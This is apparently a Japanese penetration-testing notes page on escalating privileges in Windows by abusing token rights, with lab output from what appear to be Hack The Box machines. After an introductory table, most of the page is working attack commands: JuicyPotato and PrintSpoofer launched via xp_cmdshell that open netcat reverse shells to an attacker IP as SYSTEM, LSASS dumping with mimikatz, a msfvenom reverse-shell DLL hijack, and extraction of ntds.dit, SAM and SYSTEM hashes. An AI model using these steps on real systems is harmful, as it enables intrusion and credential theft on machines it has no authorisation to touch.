# Windows における権利と特権

# ユーザー権利の割り当て

これらの権限により、ユーザーはローカルまたはリモートでのログオン、ネットワークからのホストへのアクセス、サーバーのシャットダウンなどのタスクをシステム上で実行できるようになる

このマイクロソフトの記事 [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) では、Windows で設定できる各ユーザー権利と、各権利に適用されるセキュリティに関する考慮事項について書かれている

| 設定 [定数](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | 設定名                                                       | 標準割り当て                                            | 説明                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------- | ------------------------------------------------------------ |
| SeNetworkLogonRight                                          | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network) | Administrators, Authenticated Users                     | どのユーザーがネットワークからデバイスに接続できるかを決定する。これは、SMB、NetBIOS、CIFS、COM+ などのネットワーク プロトコルで必要 |
| SeRemoteInteractiveLogonRight                                | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) | Administrators, Remote Desktop Users                    | このポリシー設定は、リモート デスクトップ サービス接続を通じてリモート デバイスのログイン画面にアクセスできるユーザーまたはグループを決定する。ユーザーは特定のサーバーへのリモート デスクトップ サービス接続を確立できるが、同じサーバーのコンソールにログオンすることはできない |
| SeBackupPrivilege                                            | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories) | Administrators                                          | このユーザー権利は、システムをバックアップする目的で、ファイル、ディレクトリ、レジストリ、およびその他の永続オブジェクトのアクセス許可をバイパスできるユーザーを決定する |
| SeSecurityPrivilege                                          | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log) | Administrators                                          | このポリシー設定は、ファイル、Active Directory オブジェクト、レジストリ キーなどの個々のリソースに対してオブジェクト アクセス監査オプションを指定できるユーザーを決定する。これらのオブジェクトは、システム アクセス制御リスト (SACL) を指定する。このユーザー権利を割り当てられたユーザーは、イベント ビューアーでセキュリティ ログを表示およびクリアすることもできる |
| SeTakeOwnershipPrivilege                                     | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) | Administrators                                          | このポリシー設定は、Active Directory オブジェクト、NTFS ファイルとフォルダー、プリンター、レジストリ キー、サービス、プロセス、スレッドなど、デバイス内のセキュリティ保護可能なオブジェクトの所有権をどのユーザーが取得できるかを決定する |
| SeDebugPrivilege                                             | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) | Administrators                                          | このポリシー設定は、どのユーザーがプロセス (自分が所有していないプロセスであっても) にアタッチしたり、プロセスを開いたりできるかを決定する。アプリケーションをデバッグしている開発者には、このユーザー権利は必要ない。新しいシステム コンポーネントをデバッグする開発者には、このユーザー権利が必要。このユーザー権利により、機密性の高い重要なオペレーティング システム コンポーネントへのアクセスが提供される |
| SeImpersonatePrivilege                                       | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) | Administrators, Local Service, Network Service, Service | このポリシー設定は、どのプログラムがユーザーまたは別の指定されたアカウントになりすましてユーザーの代わりに動作することを許可するかを決定する |
| SeLoadDriverPrivilege                                        | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers) | Administrators                                          | このポリシー設定は、どのユーザーがデバイス ドライバーを動的にロードおよびアンロードできるかを決定する。新しいハードウェア用の署名付きドライバーがデバイス上の driver.cab ファイルにすでに存在する場合、このユーザー権利は必要ない。デバイス ドライバーは高度な特権コードとして実行される |
| SeRestorePrivilege                                           | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories) | Administrators                                          | このセキュリティ設定は、バックアップされたファイルとディレクトリを復元するときに、どのユーザーがファイル、ディレクトリ、レジストリ、その他の永続オブジェクトのアクセス許可をバイパスできるかを決定する。これにより、どのユーザーがオブジェクトの所有者として有効なセキュリティ プリンシパルを設定できるかが決まる |

`whoami /priv`で現在のユーザーに割り当てられているすべてのユーザー権限のリストが表示

アカウントの特権が`Disabled`でリストされている場合、それはアカウントに特定の特権が割り当てられていることを意味する。ただし、有効になるまでは、アクセス トークンで使用して、関連するアクションを実行することはできない

```powershell-session
PS C:\hatto> whoami 

winlpe-srv01\administrator


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled 
```

この記事 [Enable All Token Privileges](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) で紹介されているスクリプトを使用することですべてのトークン権限を有効にできる



# SeImpersonatePrivilege

`whoami /priv`などで `SeImpersonatePrivilege` がリストされている場合 `JuicyPotato` をしようすることで `DCOM/NTLM` リフレクションを悪用を介して `SeImpersonate` または `SeAssignPrimaryToken` 権限を悪用することができる

## JuicyPotato を使用した権限の昇格

これらの権限を使用して権限を昇格するには、まず `JuicyPotato.exe` バイナリをダウンロードし、これと `nc.exe` をターゲット サーバーにアップロードする。次に、ポート 8443 で Netcat リスナーを起動し、以下のコマンドを実行する。ここで、`-l` は COM サーバーのリスニング ポート、`-p` は起動するプログラム (cmd.exe)、`-a` は cmd.exe に渡される引数です。 `-t` は createprocess 呼び出し。以下では、`CreateProcessWithTokenW` 関数と `CreateProcessAsUser` 関数の両方を試行するようにツールに指示している。これらの関数には、それぞれ `SeImpersonate` 権限または `SeAssignPrimaryToken` 権限が必要

`impacket-mssqlclient` からの実行例

```
SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.16.8 8443 -e cmd.exe" -t *
output                                                       
----------------------------------------------------------   
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         

......                                                       

[+] authresult 0                                             

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   

NULL                                                         

[+] CreateProcessWithTokenW OK                               

[+] calling 0x000000000088ce08                               

NULL                                                         

SQL (WINLPE-SRV01\sql_dev  dbo@master)>          
```

正常に完了し、`NT AUTHORITY\SYSTEM` としてシェルを受け取ることができる

```
hatto@VMWare-Kali [11時55分02秒] [~] 
-> % rlwrap -cAr nc -lvnp 8443       
listening on [any] 8443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.43.43] 49702
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>
```

## PrintSpoofer を使用した権限の昇格

JuicyPotato は、Windows Server 2019 および Windows 10 ビルド 1809 以降では動作しない。ただし、`PrintSpoofer` と `RoguePotato` を使用すると、同じ権限を活用し、`NT AUTHORITY\SYSTEM` レベルのアクセスを取得できる

`-c` 引数を指定してツールを使用してコマンドを実行します。ここでは、`nc.exe` を使用してリバース シェルを生成します (Netcat リスナーがポート 8443 の攻撃ボックスで待機しています)。

`impacket-mssqlclient` からの実行例

```
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.8 8443 -e cmd"
output                                        
-------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege   

[+] Named pipe listening...                   

[+] CreateProcessAsUser() OK                  

NULL                                          

SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
```

正常に完了し、`NT AUTHORITY\SYSTEM` としてシェルを受け取ることができる

```
hatto@VMWare-Kali [12時26分45秒] [~] 
-> % rlwrap -cAr nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.43.43] 49719
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```



# SeDebugPrivilege

この特権を使用すると、他のプロセスのデバッグが許可され、メモリ内の読み書きが可能になる。この特権を使用して、ほとんどのアンチウイルスおよびホスト侵入防止ソリューションを回避できるさまざまなメモリインジェクション戦略を適用できる

## メモリのダンプ

[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) を [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) から使用して、プロセスのメモリをキャプチャできる。具体的には、これはユーザーがシステムに正常にログインした後にユーザーの資格情報を保存する**Local Security Authority Subsystem Service (LSASS)**プロセスに適用できる

```cmd-session
C:\hatto> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

その後、このダンプをmimikatzに読み込んでパスワードを取得できる

```cmd-session
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp  # sekurlsa::minidump で lsass.dmp を Mimikatz にロードする
mimikatz # sekurlsa::logonpasswords      # ローカル管理者アカウントの NTLM ハッシュを取得
```

## RCE

`NT SYSTEM`のシェルを取得したい場合は、次の方法があります：

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://github.com/decoder-it/psgetsystem)

PIDの取得には `tasklist` で取得できる (主に `winlogon.exe`のPIDを取得して `c:\windows\system32\cmd.exe` を起動させる)

```powershell
PS> Import-module psgetsys.ps1 
PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>    # -cmdargsは""にする
```



# SeTakeOwnershipPrivilege

この権限は`Active Directory object`, `NTFS file/folder`, `printers`, `registry keys`, `services`, `processes` などのセキュリティで保護されたオブジェクトの所有権をユーザに付与できる。管理者にはデフォルトで割り振られているが実際に標準ユーザーでこの権限が割り振られているアカウントに遭遇することはあまりない

つまり、権限がなくて参照できないファイルなどを参照できる権限を付与することができる

## 興味深いファイル

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, 
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## SeTakeOwnershipPrivilege を有効にする

権限が `Disabled` になっている場合 [EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) を使用して権限を有効にできる

もしくはこの記事 [Enable All Token Privileges](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) で紹介されているスクリプトを使用することですべてのトークン権限を有効にできる

## ファイルの所有権の取得

[Takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows バイナリを使用してファイルの所有権を変更できる

`C:\Department Shares\Private\IT\cred.txt` の所有権を取得する

```powershell-session
C:\hatto> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\hatto".
```

## 所有権の変更の確認

```powershell-session
PS C:\hatto> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\hatto
```

## ファイルACLの変更

ファイルをまだ読み取れない可能性があるため、ファイルを読み取れるようにするには、[icacls](https://learn.microsoft.com/ja-jp/windows-server/administration/windows-commands/icacls) を使用してファイル ACL を変更する

```powershell-session
PS C:\hatto> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant <権限を与えるユーザー名>:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```



# SeManageVolumePrivilege

SeManageVolumePrivilegeは、ボリュームメンテナンスタスクを実行するためのユーザーサービス権限を許可する。これにより、ディスク上のユーザー権限の割り当てを変更できるようになる

以下のエクスプロイトスクリプトをターゲットマシン上で実行する

[SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

## DLL Hijacking

スクリプトを実行することで `C:`ドライブ内System32を含むの任意のファイルに書き込むことができる

msfvenomで `tzres.dll` とうリバースシェルを作成する。これは `systeminfo` コマンドを実行したときに呼び出されるdll

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack ip> LPORT=1337 -f dll -o tzres.dll
```

ターゲットマシンの `C:\Windows\System32\wbem\tzres.dll` にコピーしてリスナーを起動、 `systeminfo` を実行することでシェルを取得できる



# SeBackupPrivilege

SeBackupPrivilege は、オブジェクトのセキュリティ設定に関係なく、ユーザーまたはプロセスにファイルとディレクトリを読み取る権限を持つ。この権限は、通常ユーザーがアクセスできないファイルをバックアップまたはコピーする機能を必要とする特定のバックアッププログラムまたはプロセスで使用できる。

[SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege/tree/master) ここから悪意のある２つのdll `SeBackupPrivilegeUtils.dll`, `SeBackupPrivilegeCmdLets.dll`をダウンロードし、アップロードする

## 権限の悪用

dllを読み込ませる

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

権限を有効にする

```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

### 機密ファイルのコピーと読み取り

```
Copy-FileSeBackupPrivilege C:\Users\Administrator\proof.txt C:\Users\Public\proof.txt -Overwrite
```

### パスワードハッシュを取得する

```
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite

reg save HKLM\SYSTEM c:\tmp\system
reg save HKLM\SAM C:\tmp\sam
```

### パスワードハッシュをdump

```
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```





